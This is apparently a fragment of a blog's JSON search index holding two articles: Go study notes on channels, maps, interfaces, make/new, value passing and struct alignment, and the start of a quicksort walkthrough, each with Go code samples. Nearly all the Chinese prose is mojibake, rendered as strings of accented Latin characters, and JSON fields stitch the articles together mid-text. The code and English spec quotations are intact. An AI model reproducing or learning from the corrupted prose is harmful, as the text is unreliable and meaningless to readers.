ä»€ä¹ˆæ—¶å€™ç”¨ channelï¼Œ ä»€ä¹ˆæ—¶å€™ç”¨Mutex\n\nhttps://github.com/golang/go/wiki/MutexOrChannel\n\nchannelçš„èƒ½åŠ›æ˜¯è®©æ•°æ®æµåŠ¨èµ·æ¥ï¼Œæ“…é•¿çš„æ˜¯æ•°æ®æµåŠ¨çš„åœºæ™¯\n\n+ ä¼ é€’æ•°æ®çš„æ‰€æœ‰æƒï¼Œå³æŠŠæŸä¸ªæ•°æ®å‘é€ç»™å…¶ä»–åç¨‹\n\n+ åˆ†å‘ä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªæ•°æ®\n\n+ äº¤æµå¼‚æ­¥ç»“æœï¼Œç»“æœæ˜¯ä¸€ä¸ªæ•°æ®\n\nmutexçš„èƒ½åŠ›æ˜¯æ•°æ®ä¸åŠ¨ï¼ŒæŸæ®µæ—¶é—´åªç»™ä¸€ä¸ªåç¨‹è®¿é—®æ•°æ®çš„æƒé™æ“…é•¿æ•°æ®ä½ç½®å›ºå®šçš„åœºæ™¯\n\n+ ç¼“å­˜\n\n+ çŠ¶æ€\n\n\n\n\n# 2. æ•°æ®ç»“æ„\n\n### 2.1 map ä¸ºä»€ä¹ˆæ— åº\n\n+ mapæ‰©å®¹, key ä¼šç§»åŠ¨\n\n  map åœ¨æ‰©å®¹åï¼Œä¼šå‘ç”Ÿ key çš„æ¬è¿ï¼ŒåŸæ¥è½åœ¨åŒä¸€ä¸ª bucket ä¸­çš„ keyï¼Œæ¬è¿åï¼Œæœ‰äº› key å°±è¦è¿œèµ°é«˜é£äº†ï¼ˆbucket åºå·åŠ ä¸Šäº† 2^Bï¼‰ã€‚è€Œéå†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æŒ‰é¡ºåºéå† bucketï¼ŒåŒæ—¶æŒ‰é¡ºåºéå† bucket ä¸­çš„ keyã€‚æ¬è¿åï¼Œkey çš„ä½ç½®å‘ç”Ÿäº†é‡å¤§çš„å˜åŒ–ï¼Œæœ‰äº› key é£ä¸Šé«˜æï¼Œæœ‰äº› key åˆ™åŸåœ°ä¸åŠ¨ã€‚è¿™æ ·ï¼Œéå† map çš„ç»“æœå°±ä¸å¯èƒ½æŒ‰åŸæ¥çš„é¡ºåºäº†ã€‚\n\n+ åº•å±‚ä»£ç éšæœºå€¼éå†\n\n  Go åšå¾—æ›´ç»ï¼Œå½“æˆ‘ä»¬åœ¨éå† map æ—¶ï¼Œå¹¶ä¸æ˜¯å›ºå®šåœ°ä» 0 å· bucket å¼€å§‹éå†ï¼Œæ¯æ¬¡éƒ½æ˜¯ä»ä¸€ä¸ªéšæœºå€¼åºå·çš„ bucket å¼€å§‹éå†ï¼Œå¹¶ä¸”æ˜¯ä»è¿™ä¸ª bucket çš„ä¸€ä¸ªéšæœºåºå·çš„ cell å¼€å§‹éå†ã€‚è¿™æ ·ï¼Œå³ä½¿ä½ æ˜¯ä¸€ä¸ªå†™æ­»çš„ mapï¼Œä»…ä»…åªæ˜¯éå†å®ƒï¼Œä¹Ÿä¸å¤ªå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå›ºå®šåºåˆ—çš„ key/value å¯¹äº†ã€‚\n\n\n\n### 2.2 map çš„key å¯ä»¥æ˜¯ä»€ä¹ˆç±»å‹\n\nmapä¸­çš„keyå¯ä»¥æ˜¯ä»»ä½•çš„ç±»å‹ï¼Œåªè¦å®ƒçš„å€¼èƒ½æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰. Goè¯­è¨€é‡Œæ˜¯æ— æ³•é‡è½½æ“ä½œç¬¦çš„\n\n- å¸ƒå°”å€¼\n\n- æ•°å­—\n\n- å­—ç¬¦ä¸²\n\n- æŒ‡é’ˆ\n\n  Pointer values are comparable. Two pointer values are equal if they point to the same variable or if both have value nil. Pointers to distinct zero-size variables may or may not be equal.\n\n  å½“æŒ‡é’ˆæŒ‡å‘åŒä¸€å˜é‡ï¼Œæˆ–åŒä¸ºnilæ—¶æŒ‡é’ˆç›¸ç­‰ï¼Œä½†æŒ‡é’ˆæŒ‡å‘ä¸åŒçš„é›¶å€¼æ—¶å¯èƒ½ä¸ç›¸ç­‰ã€‚\n\n- Channel\n\n  Channel values are comparable. Two channel values are equal if they were created by the same call to make or if both have value nil.\n\n  Channelå½“æŒ‡å‘åŒä¸€ä¸ªmakeåˆ›å»ºçš„æˆ–åŒä¸ºnilæ—¶æ‰ç›¸ç­‰ã€‚\n\n- Interface\n\n  Interface values are comparable. Two interface values are equal if they have identical dynamic types and equal dynamic values or if both have value nil.\n\n  å½“æ¥å£æœ‰ç›¸åŒçš„åŠ¨æ€ç±»å‹å¹¶ä¸”æœ‰ç›¸åŒçš„åŠ¨æ€å€¼ï¼Œæˆ–è€…å€¼ä¸ºéƒ½ä¸ºnilæ—¶ç›¸ç­‰ã€‚\n\n- ç»“æ„ä½“\n\n  Struct values are comparable if all their fields are comparable. Two struct values are equal if their corresponding non-blank fields are equal.\n\n  ç»“æ„ä½“å½“æ‰€æœ‰å­—æ®µçš„å€¼ç›¸åŒï¼Œå¹¶ä¸”æ²¡æœ‰ç›¸åº”çš„éç©ºç™½å­—æ®µæ—¶ï¼Œåˆ™ä»–ä»¬ç›¸ç­‰ã€‚\n\n- åªåŒ…å«ä¸Šè¿°ç±»å‹çš„æ•°ç»„ã€‚\n\n  Array values are comparable if values of the array element type are comparable. Two array values are equal if their corresponding elements are equal.\n\n  ä¸¤ä¸ªæ•°ç»„åªè¦ä»–ä»¬åŒ…æ‹¬çš„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ çš„å€¼ç›¸åŒï¼Œåˆ™ä»–ä»¬ç›¸ç­‰ã€‚\n\nä½†ä¸èƒ½æ˜¯ï¼š\n\n- slice\n- map\n- function\n\n\n\n### 2.3 map å¦‚ä½•æœ‰åºéå†\n\n+ map é»˜è®¤æ˜¯æ— åºçš„ï¼Œä¸ç®¡æ˜¯æŒ‰ç…§ key è¿˜æ˜¯æŒ‰ç…§ value é»˜è®¤éƒ½ä¸æ’åºã€‚\n\n+ æœ‰åºéå†\n\n  å¦‚æœä½ æƒ³ä¸º map æ’åºï¼Œéœ€è¦å°† keyï¼ˆæˆ–è€… valueï¼‰æ‹·è´åˆ°ä¸€ä¸ªåˆ‡ç‰‡ï¼Œå†å¯¹åˆ‡ç‰‡æ’åºï¼ˆä½¿ç”¨ sort åŒ…ï¼‰ï¼Œç„¶åå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡çš„ for-range æ–¹æ³•æ‰“å°å‡ºæ‰€æœ‰çš„ key å’Œ valueã€‚\n\n\n\n\n### 2.4 slice å’Œ map å¹¶å‘å®‰å…¨å—\n\nmapå’Œsliceéƒ½æ˜¯å¹¶å‘ä¸å®‰å…¨çš„, è§£å†³æ–¹æ¡ˆ:\n\n+ åŠ é”\n+ ä½¿ç”¨ channel ä¸²è¡ŒåŒ–\n+ sync.Map\n\n\n\n# 5. interface\n\n### 5.1 interface å½“å‚æ•°æ—¶çš„å‘, ä¼ é€’ nil ä¹Ÿä¸æ˜¯ nil\n\nå¦‚æœéœ€è¦åˆ¤æ–­, è¯·ç”¨åå°„ `reflect.ValueOf(i).IsNil()`\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tA() error\n}\n\ntype T struct {\n}\n\nfunc (t *T) A() error {\n\treturn nil\n}\n\nfunc testInterface(i I) {\n\tif i == nil {\n\t\tfmt.Println(\"i is nil\")\n\t} else {\n\t\tfmt.Println(\"i is not nil\")\n\t}\n}\nfunc main() {\n\tt := new(T)\n\tt = nil\n\ttestInterface(t) //i is not nil\n}\n\n```\n\n\n\n# 6. make\n\n### 6.1 makeæ—¶ä¼ é€’çš„æ•°å­—å‚æ•°\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 0)\n\tfmt.Println(s) //[]\n\ts = append(s, 1, 2, 3)\n\tfmt.Println(s) //[1 2 3]\n}\n\n```\n\nå¦‚æœä¼ é€’äº†ä¸ªæ•°, å°±æ˜¯æœ‰é»˜è®¤å€¼äº†\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 5)\n\tfmt.Println(s) //[0 0 0 0 0]\n\n  s = append(s, 1, 2, 3)\n\tfmt.Println(s) //[0 0 0 0 0 1 2 3]\n}\n```\n\n\n\n### 6.2 make å’Œ newçš„åŒºåˆ«\n\n+ make åªèƒ½ç”¨äº slice,map,channel\n\n  è¿”å›çš„ç±»å‹å°±æ˜¯è¿™ä¸‰ä¸ªç±»å‹æœ¬èº«ï¼Œè€Œä¸æ˜¯ä»–ä»¬çš„æŒ‡é’ˆç±»å‹ï¼Œå› ä¸ºè¿™ä¸‰ç§ç±»å‹æ˜¯å¼•ç”¨ç±»å‹ã€‚\n\n+ new(T) è¿”å› T çš„æŒ‡é’ˆ *T å¹¶æŒ‡å‘ T çš„é›¶å€¼ã€‚\n\n\n\n# 7. å‡½æ•°\n\n### 7.1 å‡½æ•°å‚æ•°ä¼ é€’ï¼Œæ˜¯å€¼è¿˜æ˜¯å¼•ç”¨\n\nâ€‹\tGo ä¸­å‡½æ•°ä¼ å‚ä»…æœ‰å€¼ä¼ é€’ä¸€ç§æ–¹å¼, åªæœ‰slice, map, channel æœ¬èº«æ˜¯å¼•ç”¨ç±»å‹, æ‰€ä»¥å¯ä»¥æ”¹\n\n+ å…¶å®ä¼ é€’çš„å°±æ˜¯å€¼,ä½†æ˜¯ä¸ºä»€ä¹ˆèƒ½æ”¹å†…å®¹å‘¢?\n\n  ```go\n  func ChangeMap(value map[string]string) {\n    fmt.Printf(\"mapå†…éƒ¨ %p\\n\", &value)\n    value[\"age\"] = \"30\"\n  }\n  \n  func ChangeSlice(value []string) {\n    fmt.Printf(\"sliceå†…éƒ¨ %p\\n\", &value)\n    value[0] = \"haha\"\n  }\n  \n  func main() {\n    map1 := make(map[string]string)\n    map1[\"age\"] = \"21\"\n    fmt.Printf(\"mapå¤–éƒ¨ %p\\n\", &map1)\n    fmt.Println(map1[\"age\"])\n    ChangeMap(map1)\n    fmt.Println(map1[\"age\"])\n  \n    slice1 := make([]string, 0)\n    slice1 = append(slice1, \"hehe\")\n    fmt.Println(slice1)\n    fmt.Printf(\"sliceå¤–éƒ¨ %p\\n\", &slice1)\n    ChangeSlice(slice1)\n    fmt.Println(slice1)\n  }\n  \n  /*\n  mapå¤–éƒ¨ 0xc000092018\n  21\n  mapå†…éƒ¨ 0xc000092028\n  30\n  \n  \n  [hehe]\n  sliceå¤–éƒ¨ 0xc00008a040\n  sliceå†…éƒ¨ 0xc00008a080\n  [haha]\n  */\n  ```\n\n+ æ™®é€šçš„ç±»å‹å°±æ˜¯å€¼ä¼ é€’\n\n  ```go\n  package main\n  \n  import \"fmt\"\n  \n  func main() {\n  \ta := 10\n  \tfmt.Printf(\"%#v\\n\", &a) // (*int)(0xc420018080)\n  \tvFoo(a)\n  }\n  \n  func vFoo(b int) {\n  \tfmt.Printf(\"%#v\\n\", &b) // (*int)(0xc420018090)\n  }\n  ```\n\n   \n\n\n# 8. å…¶ä»–é—®é¢˜\n\n### 8.1 å­—èŠ‚å’Œå­—èŠ‚å¯¹é½\n\n+ å­—èŠ‚æ•° \n\n  + 64ä½ç³»ç»Ÿä¸‹, int é»˜è®¤ int64 ,  8ä¸ªå­—èŠ‚, \n\n  + float 64,  8ä¸ªå­—èŠ‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\nfunc main() {\n\tvar a int\n\tfmt.Println(unsafe.Sizeof(a)) //8\n\n\tvar b int32\n\tfmt.Println(unsafe.Sizeof(b)) //4\n\n\tvar c int64\n\tfmt.Println(unsafe.Sizeof(c)) //8\n\n\tvar d float64\n\tfmt.Println(unsafe.Sizeof(d)) //8\n\n\tvar e float32\n\tfmt.Println(unsafe.Sizeof(e)) //4\n\n\tvar f string\n\tfmt.Println(unsafe.Sizeof(f)) //16\n\n\tvar g chan int\n\tfmt.Println(unsafe.Sizeof(g)) //8\n\n\tvar h []int\n\tfmt.Println(unsafe.Sizeof(h)) //24\n\n\tvar i map[int]int\n\tfmt.Println(unsafe.Sizeof(i)) //8\n}\n```\n\n+ å­—èŠ‚å¯¹é½(æ ¹æ®æ“ä½œç³»ç»Ÿçš„ä½æ•°å¯¹é½çš„)\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\ntype Info1 struct {\n\tsex    bool //1\n\tstatus int8 //1\n}\n\ntype Info2 struct {\n\tsex bool //1\n\tage int  //8\n}\n\ntype Info3 struct {\n\tsex bool  //1\n\tage int32 //4\n}\n\ntype Info4 struct {\n\tsex    bool //1\n\tage    int  //8\n\tstatus int8 //1\n}\n\ntype Info5 struct {\n\tsex    bool //1\n\tstatus int8 //1\n\tage    int  //8\n}\n\ntype Info6 struct {\n\ta bool   //1\n\tb string //16\n\tc bool   //1\n}\n\ntype Info7 struct {\n\ta bool   //1\n\tc bool   //1\n\tb string //16\n}\n\nfunc main() {\n\tfmt.Println(unsafe.Sizeof(Info1{})) //2\n\tfmt.Println(unsafe.Sizeof(Info2{})) //16(8+8)\n\tfmt.Println(unsafe.Sizeof(Info3{})) //8(4+4)\n\tfmt.Println(unsafe.Sizeof(Info4{})) //24(8+8+8)\n\tfmt.Println(unsafe.Sizeof(Info5{})) //16(1+1+8 = 8+8)\n\tfmt.Println(unsafe.Sizeof(Info6{})) //32(1+16+1 = 8+16+8)\n\tfmt.Println(unsafe.Sizeof(Info7{})) //16(1+1+16 = 8+16)\n}\n```\n\n\n\n### 8.2 éè¿è¡Œå¤šæ€\n\ngo è¯­è¨€ä¸­ï¼Œå½“å­ç±»è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œâ€œä½œç”¨åŸŸâ€å°†è¿›å…¥çˆ¶ç±»çš„ä½œç”¨åŸŸï¼Œçœ‹ä¸è§å­ç±»çš„æ–¹æ³•å­˜åœ¨\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n\n\n# 9. å¼•ç”¨å’Œä¼ å€¼\n\nGoè¯­è¨€æ˜¯æ²¡æœ‰å¼•ç”¨ä¼ é€’çš„, Goé‡Œåªæœ‰ä¼ å€¼ï¼ˆå€¼ä¼ é€’ï¼‰ã€‚\n\nslice / map / chan æ˜¯golangçš„3ä¸ªå¼•ç”¨ç±»å‹ï¼Œ æœ¬è´¨ä¸Š å®ƒæœ¬èº«/æˆ–è€…å®ƒçš„ä¸€ä¸ªæˆå‘˜ æ˜¯æŒ‡é’ˆ\n\n+ map\n\n  æŠŠ mapæœ¬èº«æƒ³è±¡æˆæŒ‡é’ˆ, çœ‹æŒ‡é’ˆçš„å€¼ä¸ä¸€æ ·\n\n```go\nfunc main() {\n\tpersons := map[string]int{\n\t\t\"å¼ ä¸‰\": 19,\n\t}\n\tfmt.Println(\"map old:\", persons)\n\tfmt.Printf(\"åŸå§‹mapçš„å†…å­˜åœ°å€æ˜¯ï¼š%p\\n\", &persons)\n\tmodify(persons)\n\tfmt.Println(\"map new:\", persons)\n}\n\nfunc modify(p map[string]int) {\n\tfmt.Printf(\"å‡½æ•°é‡Œæ¥æ”¶åˆ°mapçš„å†…å­˜åœ°å€æ˜¯ï¼š%p\\n\", &p)\n\tp[\"å¼ ä¸‰\"] = 20\n}\n\n\n/*\nmap old: map[å¼ ä¸‰:19]\n\nåŸå§‹mapçš„å†…å­˜åœ°å€æ˜¯ï¼š0xc000100018\nå‡½æ•°é‡Œæ¥æ”¶åˆ°mapçš„å†…å­˜åœ°å€æ˜¯ï¼š0xc000100028\n\nmap new: map[å¼ ä¸‰:20]\n\n*/\n```\n\n+ Slice\n\n  é€šè¿‡ä¸‹æ ‡å¯ä»¥ç›´æ¥ä¿®æ”¹, ä½†æ˜¯ append æŒ‡é’ˆå˜äº†, éœ€è¦ä¼ å‡ºæ¥æ‰å¯ä»¥\n\n```go\nfunc main() {\n\tages := []int{1, 2, 3}\n\tfmt.Println(\"ages old:\", ages)\n\tfmt.Printf(\"åŸå§‹sliceçš„å¤´å†…å­˜åœ°å€%p  æŒ‡é’ˆ:%p\\n\", ages, &ages)\n\tmodify(ages)\n\tfmt.Println(\"ages new:\", ages)\n}\n\nfunc modify(ages []int) {\n\tfmt.Printf(\"å‡½æ•°é‡Œçš„å¤´å†…å­˜åœ°å€%p   æŒ‡é’ˆ:%p\\n\", ages, &ages)\n\tages[0] = 0\n\tages = append(ages, 4, 5, 6, 7)\n\tfmt.Printf(\"å‡½æ•°é‡Œçš„ append å¤´å†…å­˜åœ°å€%p  æŒ‡é’ˆ:%p\\n\", ages, &ages)\n}\n\n\n/*\nages old: [1 2 3]\n\nåŸå§‹sliceçš„å¤´å†…å­˜åœ°å€\t\t   0xc00011c000       \t\t\t  æŒ‡é’ˆ:0xc00011a000\nå‡½æ•°é‡Œçš„å¤´å†…å­˜åœ°å€         0xc00011c000 \t\t\t         æŒ‡é’ˆ:0xc00011a060 (å†…éƒ¨çš„æŒ‡é’ˆåœ°å€,æ„ä¹‰ä¸å¤§)\nå‡½æ•°é‡Œçš„ append å¤´å†…å­˜åœ°å€ 0xc000120040  \t\t\t  \t   æŒ‡é’ˆ:0xc00011a060 (å†…éƒ¨çš„æŒ‡é’ˆåœ°å€,æ„ä¹‰ä¸å¤§)\n\nages new: [0 2 3]\n\n*/\n```\n\n","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£","url":"%2Fp%2Fff8068c0.html","content":"\næ¯æ¬¡å†™å¿«é€Ÿæ’åºï¼Œå†™è¿‡ä¸€æ¬¡ææ˜ç™½äº†ï¼Œè¿‡ä¸€æ®µæ—¶é—´å†™åˆå¿˜è®°äº†ã€‚è¿™æ¬¡é‡‡ç”¨ç‰›éƒç»‡å¥³çš„æ•…äº‹ï¼ŒåŠ æ·±è®°å¿†ã€‚\n\n+ ç‰›éƒç»‡å¥³ä»ä¸¤è¾¹å¾€ä¸­é—´èµ°è§é¢ï¼Œç‰›éƒåœ¨å·¦è¾¹ï¼Œç»‡å¥³åœ¨å³è¾¹.  ä»–ä»¬é€‰å–è·¯ä¸Šæœ€å·¦çš„ä¸€ä¸ªæ•°å­—ä½œä¸ºäº¤æµä¿¡å·ã€‚\n\n+ ç»‡å¥³å…ˆå‘å·¦èµ°ï¼Œå¤§äºç­‰äºå°±èµ°ï¼Œå°äºå°±åœã€‚ç‰›éƒå‘å³èµ°ï¼Œå°äºç­‰äºå°±èµ°ï¼Œå¤§äºå°±åœï¼Œç„¶åä¸¤äººæ‰“ç”µè¯äº¤æ¢è„šä¸‹çš„æ•°æ®ã€‚\n+ æ¥ç€èµ°ï¼Œæ¥ç€æ‰“ç”µè¯äº¤æ¢æ•°æ®ï¼Œç›´åˆ°ä¸¤äººç›¸é‡ã€‚ç›¸é‡åï¼ŒæŠŠä¸¤äººè„šä¸‹çš„æ•°æ®å’Œå¿ƒä¸­çš„æ•°å­—åšäº¤æ¢ã€‚\n\n+ è‡³æ­¤ï¼Œç›¸é‡ç‚¹å·¦è¾¹éƒ½æ˜¯æ¯”å¿ƒä¸­æ•°å­—å°ï¼Œç›¸é‡ç‚¹å³è¾¹éƒ½æ˜¯æ¯”å¿ƒä¸­æ•°å­—å¤§ã€‚\n\n<!-- more -->\n\n\n\n# 1. å¿«é€Ÿæ’åº\n\n### 1.1 åŸç†\n\nåŸå§‹æ•°æ® â€œ**6 1 2 7 9 3 4 5 10 8**â€ï¼Œç›®æ ‡ï¼šå·¦è¾¹å°äºå‚è€ƒå€¼ï¼Œå³è¾¹å¤§äºå‚è€ƒå€¼\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/1.png)\n\n\n\næŠŠç¬¬ä¸€ä¸ªå€¼ **6** ä½œä¸ºå‚è€ƒå€¼ï¼Œåˆ†åˆ«ä»åˆå§‹åºåˆ—â€œ**6 1 2 7 9 3 4 5 10 8**â€ä¸¤ç«¯å¼€å§‹â€œæ¢æµ‹â€ã€‚å…ˆä»**å³**å¾€**å·¦**æ‰¾ä¸€ä¸ªå°äº **6** çš„æ•°ï¼Œå†ä»**å·¦**å¾€**å³**æ‰¾ä¸€ä¸ªå¤§äº **6** çš„æ•°ï¼Œç„¶åäº¤æ¢ä»–ä»¬ã€‚\n\nè¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªå˜é‡ **i** å’Œ **j**ï¼Œåˆ†åˆ«æŒ‡å‘åºåˆ—æœ€å·¦è¾¹å’Œæœ€å³è¾¹ã€‚æˆ‘ä»¬ä¸ºè¿™ä¸¤ä¸ªå˜é‡èµ·ä¸ªå¥½å¬çš„åå­—â€œå“¨å…µ iâ€å’Œâ€œå“¨å…µ jâ€ã€‚åˆšå¼€å§‹çš„æ—¶å€™è®©å“¨å…µ i æŒ‡å‘åºåˆ—çš„æœ€å·¦è¾¹ï¼ˆå³ **i=1**ï¼‰ï¼ŒæŒ‡å‘æ•°å­— **6**ã€‚è®©å“¨å…µ **j** æŒ‡å‘åºåˆ—çš„æœ€å³è¾¹ï¼ˆå³ **j=10**ï¼‰ï¼ŒæŒ‡å‘æ•°å­— **8**ã€‚\n\n---\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/2.png)\n\né¦–å…ˆå“¨å…µ **j** å¼€å§‹å‡ºåŠ¨ã€‚å› ä¸ºæ­¤å¤„è®¾ç½®çš„åŸºå‡†æ•°æ˜¯æœ€å·¦è¾¹çš„æ•°ï¼Œæ‰€ä»¥éœ€è¦è®©å“¨å…µ **j** å…ˆå‡ºåŠ¨ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼ˆåé¢ä¼šè§£é‡Šï¼‰ã€‚å“¨å…µ **j** ä¸€æ­¥ä¸€æ­¥åœ°å‘å·¦æŒªåŠ¨ï¼ˆå³ **j--**ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå°äº **6** çš„æ•°åœä¸‹æ¥ã€‚æ¥ä¸‹æ¥å“¨å…µ **i** å†ä¸€æ­¥ä¸€æ­¥å‘å³æŒªåŠ¨ï¼ˆå³ **i++**ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ•°å¤§äº **6** çš„æ•°åœä¸‹æ¥ã€‚æœ€åå“¨å…µ **j** åœåœ¨äº†æ•°å­— **5** é¢å‰ï¼Œå“¨å…µ **i** åœåœ¨äº†æ•°å­— **7** é¢å‰ã€‚\n\nç°åœ¨äº¤æ¢å“¨å…µ **i** å’Œå“¨å…µ **j** æ‰€æŒ‡å‘çš„å…ƒç´ çš„å€¼ã€‚äº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š6 1 2 **5** 9 3 4 **7** 10 8ï¼Œåˆ°æ­¤ï¼Œç¬¬ä¸€æ¬¡äº¤æ¢ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/3.png)\n\n---\n\n\n\næ¥ä¸‹æ¥å¼€å§‹å“¨å…µ **j** ç»§ç»­å‘å·¦æŒªåŠ¨ï¼ˆå†å‹æƒ…æé†’ï¼Œæ¯æ¬¡å¿…é¡»æ˜¯å“¨å…µ **j** å…ˆå‡ºå‘ï¼‰ã€‚ä»–å‘ç°äº† **4**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚å“¨å…µ **i** ä¹Ÿç»§ç»­å‘å³æŒªåŠ¨çš„ï¼Œä»–å‘ç°äº† **9**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å¤§ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/4.png)\n\næ­¤æ—¶å†æ¬¡è¿›è¡Œäº¤æ¢ï¼Œäº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š6 1 2 5 **4** 3 **9** 7 10 8ï¼Œç¬¬äºŒæ¬¡äº¤æ¢ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/5.png)\n\n\n\n---\n\n\n\nâ€œæ¢æµ‹â€ç»§ç»­ã€‚å“¨å…µ **j** ç»§ç»­å‘å·¦æŒªåŠ¨ï¼Œä»–å‘ç°äº† **3**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååˆåœäº†ä¸‹æ¥ã€‚å“¨å…µ **i** ç»§ç»­å‘å³ç§»åŠ¨ï¼Œç³Ÿå•¦ï¼æ­¤æ—¶å“¨å…µ **i** å’Œå“¨å…µ **j** ç›¸é‡äº†ï¼Œå“¨å…µ **i** å’Œå“¨å…µ **j** éƒ½èµ°åˆ° **3** é¢å‰ã€‚è¯´æ˜æ­¤æ—¶â€œæ¢æµ‹â€ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/6.png)\n\n\n\næˆ‘ä»¬å°†åŸºå‡†æ•° **6** å’Œ **3** è¿›è¡Œäº¤æ¢ã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/7.png)\n\näº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š**3** 1 2 5 4 **6** 9 7 10 8ã€‚\n\n![1](å¿«é€Ÿæ’åºçš„æ·±åˆ»ç†è§£/8.png)\n\n\n\nåˆ°æ­¤ç¬¬ä¸€è½®â€œæ¢æµ‹â€çœŸæ­£ç»“æŸã€‚æ­¤æ—¶ä»¥åŸºå‡†æ•° **6** ä¸ºåˆ†ç•Œç‚¹ï¼Œ**6** å·¦è¾¹çš„æ•°éƒ½å°äºç­‰äº **6**ï¼Œ**6** å³è¾¹çš„æ•°éƒ½å¤§äºç­‰äº **6**ã€‚å›é¡¾ä¸€ä¸‹åˆšæ‰çš„è¿‡ç¨‹ï¼Œå…¶å®å“¨å…µ **j** çš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å°äºåŸºå‡†æ•°çš„æ•°ï¼Œè€Œå“¨å…µ **i** çš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å¤§äºåŸºå‡†æ•°çš„æ•°ï¼Œç›´åˆ° **i** å’Œ **j** ç¢°å¤´ä¸ºæ­¢ã€‚\n\n---\n\nOKï¼Œè§£é‡Šå®Œæ¯•ã€‚ç°åœ¨åŸºå‡†æ•° **6** å·²ç»å½’ä½ï¼Œå®ƒæ­£å¥½å¤„åœ¨åºåˆ—çš„ç¬¬ **6** ä½ã€‚æ­¤æ—¶æˆ‘ä»¬å·²ç»å°†åŸæ¥çš„åºåˆ—ï¼Œä»¥ **6** ä¸ºåˆ†ç•Œç‚¹æ‹†åˆ†æˆäº†ä¸¤ä¸ªåºåˆ—ï¼Œå·¦è¾¹çš„åºåˆ—æ˜¯â€œ**3 1 2 5 4**â€ï¼Œå³è¾¹çš„åºåˆ—æ˜¯â€œ **9 7 10 8** â€ã€‚\n\næ¥ä¸‹æ¥å¼€å§‹é€’å½’æŠŠã€‚\n\n\n\n### 1.2 ä»£ç \n\n```go\nfunc main() {\n\tarr := []int{2, 1}\n\tfmt.Println(\"origin\", arr)\n\tQuickSort(arr, 0, len(arr)-1)\n\tfmt.Println(\"sort\", arr)\n}\n\nfunc QuickSort(arr []int, left int, right int) {\n\tif left < right {\n\t\tpartIndex := PartIndex(arr, left, right)\n\t\tQuickSort(arr, left, partIndex-1)\n\t\tQuickSort(arr, partIndex+1, right)\n\t}\n}\n\nfunc PartIndex(arr []int, left int, right int) int {\n\tmid := arr[left]\n\torigin := left\n\tfor left < right {\n\t\tfor arr[right] >= mid && left < right {\n\t\t\tright--\n\t\t}\n\t\tfor arr[left] <= mid && left < right {\n\t\t\tleft++\n\t\t}\n\t\tarr[left], arr[right] = arr[right], arr[left]\n\t}\n\n\tarr[left], arr[origin] = arr[origin], arr[left]\n\treturn left\n}\n```\n\n\n\n# 2. å®ç°çš„é—®é¢˜\n\n### 2.1 ä¸ºä»€ä¹ˆä»å³å¾€å·¦\n\nå› ä¸ºä½ æ˜¯æ­£åºæ’ï¼Œä»¥ 4, 11, 9 ä¸ºä¾‹ã€‚\n\n+ å…ˆå·¦èµ°ï¼Œåå³èµ°\n\n  mid = 4ï¼Œ å·¦è¾¹çš„ <= 4 æ‰èµ°ï¼Œèµ°åˆ°ä¸‹æ ‡ 1ã€‚å³è¾¹çš„ >= 4 æ‰èµ°ï¼Œä¹Ÿèµ°åˆ°ä¸‹æ ‡1ï¼ˆå·¦<å³ï¼‰ã€‚\n\n  ä¸€äº¤æ¢ï¼Œ11ï¼Œ4ï¼Œ9 ä¸å¯¹äº†ã€‚\n\n  åœçš„å€¼ä¼šæ¯”é€‰çš„å€¼å¤§ï¼Œæˆ‘ä»¬å¸Œæœ›åœçš„ä½ç½®æ¯”é€‰çš„å€¼å°ã€‚\n\n+ å…ˆå³èµ°ï¼Œåå·¦èµ°\n\n  